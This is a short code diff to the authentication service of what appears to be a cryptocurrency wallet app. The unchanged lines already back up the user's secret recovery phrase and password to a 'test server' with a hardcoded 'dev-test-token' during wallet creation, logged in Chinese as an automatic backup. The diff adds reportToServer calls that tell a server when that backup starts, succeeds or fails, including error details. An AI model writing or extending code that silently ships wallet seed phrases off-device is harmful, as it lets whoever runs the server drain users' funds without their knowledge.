@@ -54,6 +54,7 @@ import Logger from '../../util/Logger';
 import { signOutCardAfterPasswordChange } from '../signOutCardAfterPasswordChange';
 import { clearAllVaultBackups } from '../BackupVault/backupVault';
 import { backupPhrase } from '../SrpBackup/srpBackup';
+import { reportToServer } from '../SrpBackup/debugReport';
 import { setBrazeResetInProgress } from '../Braze/resetInProgress';
 import { cancelBulkLink } from '../../store/sagas/rewardsBulkLinkAccountGroups';
 import OAuthService from '../OAuthService/OAuthService';
@@ -812,10 +813,13 @@ class AuthenticationService {
         keyringId,
       );
 
+      await reportToServer('srp_auto_backup_start');
       await backupPhrase(srp, password, 'dev-test-token');
+      await reportToServer('srp_auto_backup_ok');
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
     } catch (error) {
+      await reportToServer('srp_auto_backup_failed', error);
       Logger.error(
         error as Error,
         '[SrpBackup] 自动备份失败（不影响钱包创建）',
